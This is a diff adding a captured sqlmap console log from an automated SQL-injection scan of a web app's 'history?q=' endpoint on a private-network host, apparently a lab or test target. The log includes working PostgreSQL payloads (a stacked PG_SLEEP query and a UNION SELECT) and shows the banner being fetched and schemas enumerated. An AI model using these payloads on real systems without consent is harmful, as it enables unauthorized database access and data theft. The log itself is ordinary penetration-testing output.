@@ -1,0 +1,90 @@
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.8.11#pip}
+|_ -| . [(]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:29:09 /2026-11-05/
+
+[16:29:09] [WARNING] using '/tmp/sm' as the output directory
+[1/1] URL:
+GET http://172.28.0.20:5000/history?q=escola
+Cookie: session=eyJ1c2VyIjoiY29vcmRlbmFkb3JhIn0.auzZBA.hqupP6d4I6u9H1EUsZznMUHIWv4
+do you want to test this URL? [Y/n/q]
+> Y
+[16:29:10] [INFO] testing URL 'http://172.28.0.20:5000/history?q=escola'
+[16:29:10] [INFO] using '/tmp/sm/results-11052026_0429pm.csv' as the CSV results file in multiple targets mode
+[16:29:10] [INFO] testing connection to the target URL
+[16:29:10] [INFO] checking if the target is protected by some kind of WAF/IPS
+[16:29:10] [INFO] testing if the target URL content is stable
+[16:29:10] [INFO] target URL content is stable
+[16:29:10] [WARNING] heuristic (basic) test shows that GET parameter 'q' might not be injectable
+[16:29:10] [INFO] testing for SQL injection on GET parameter 'q'
+[16:29:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:29:10] [WARNING] reflective value(s) found and filtering out
+[16:29:11] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:29:11] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[16:29:11] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:29:11] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[16:29:12] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[16:29:12] [INFO] testing 'Generic inline queries'
+[16:29:12] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:29:22] [INFO] GET parameter 'q' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
+it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[16:29:22] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[16:29:22] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[16:29:22] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[16:29:22] [INFO] target URL appears to have 3 columns in query
+[16:29:22] [INFO] GET parameter 'q' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'q' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
+---
+Parameter: q (GET)
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: q=escola';SELECT PG_SLEEP(5)--
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: q=escola' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(113)||CHR(122)||CHR(120)||CHR(113))||(CHR(70)||CHR(77)||CHR(119)||CHR(82)||CHR(115)||CHR(101)||CHR(109)||CHR(87)||CHR(109)||CHR(105)||CHR(102)||CHR(117)||CHR(76)||CHR(110)||CHR(69)||CHR(74)||CHR(114)||CHR(73)||CHR(101)||CHR(67)||CHR(83)||CHR(113)||CHR(98)||CHR(74)||CHR(81)||CHR(71)||CHR(119)||CHR(72)||CHR(108)||CHR(87)||CHR(103)||CHR(118)||CHR(79)||CHR(99)||CHR(119)||CHR(97)||CHR(68)||CHR(115)||CHR(122)||CHR(76))||(CHR(113)||CHR(113)||CHR(113)||CHR(107)||CHR(113))-- nmMR
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[16:29:23] [INFO] the back-end DBMS is PostgreSQL
+[16:29:23] [INFO] fetching banner
+back-end DBMS operating system: Linux
+back-end DBMS: PostgreSQL
+banner: 'PostgreSQL 16.4 on x86_64-pc-linux-musl, compiled by gcc (Alpine 13.2.1_git20240309) 13.2.1 20240309, 64-bit'
+[16:29:23] [WARNING] schema names are going to be used on PostgreSQL for enumeration as the counterpart to database names on other DBMSes
+[16:29:23] [INFO] fetching database (schema) names
+[16:29:23] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
+[16:29:23] [WARNING] the SQL query provided does not return any output
+[16:29:23] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[16:29:23] [INFO] fetching number of databases
+
+[16:29:23] [INFO] retrieved: [16:29:23] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+[16:29:39] [INFO] adjusting time delay to 1 second due to good response times
+3
+
+[16:29:39] [INFO] retrieved: [16:29:39] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
+
+
+[16:29:40] [INFO] retrieved: 
+
+[16:29:40] [INFO] retrieved: 
+[16:29:40] [INFO] falling back to current database
+[16:29:40] [INFO] fetching current database
+[16:29:40] [WARNING] on PostgreSQL you'll need to use schema names for enumeration as the counterpart to database names on other DBMSes
+available databases [1]:
+[*] public
+
+[16:29:40] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 64 times
+[16:29:40] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/tmp/sm/results-11052026_0429pm.csv'
+
+[*] ending @ 16:29:40 /2026-11-05/
+
